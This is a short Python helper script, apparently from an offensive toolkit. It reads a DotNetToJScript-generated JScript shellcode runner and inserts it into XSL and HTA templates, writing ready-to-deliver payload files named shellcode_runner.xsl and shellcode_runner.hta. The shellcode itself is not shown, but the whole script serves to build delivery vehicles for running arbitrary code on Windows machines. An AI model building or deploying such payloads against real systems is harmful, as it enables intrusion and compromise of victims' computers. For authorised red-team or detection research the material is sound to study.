#!/usr/bin/python3

#Read contents of JS script created by DotNetToJScript
jsfile_open=open('payloads/DotNetToJScript/shellcode_runner_caesar.js', 'r')
js_code = jsfile_open.read()
jsfile_open.close()

#Replace String in XSL file
with open('Templates/DotNetToJScript/shellcode_runner_template.xsl') as xslfile:
	xsldata = xslfile.read()
replace=xsldata.replace('PUT_JS_CODE_HERE', js_code)

#Write a new XSL file
with open('payloads/DotNetToJScript/shellcode_runner.xsl', 'w') as xslfile:
  xslfile.write(replace)

#Replace String in HTA file
with open('Templates/DotNetToJScript/shellcode_runner_template.hta') as htafile:
        htadata = htafile.read()
replace=htadata.replace('PUT_JS_CODE_HERE', js_code)

#Write a new HTA file
with open('payloads/DotNetToJScript/shellcode_runner.hta', 'w') as htafile:
  htafile.write(replace)

jsfile_open.close()
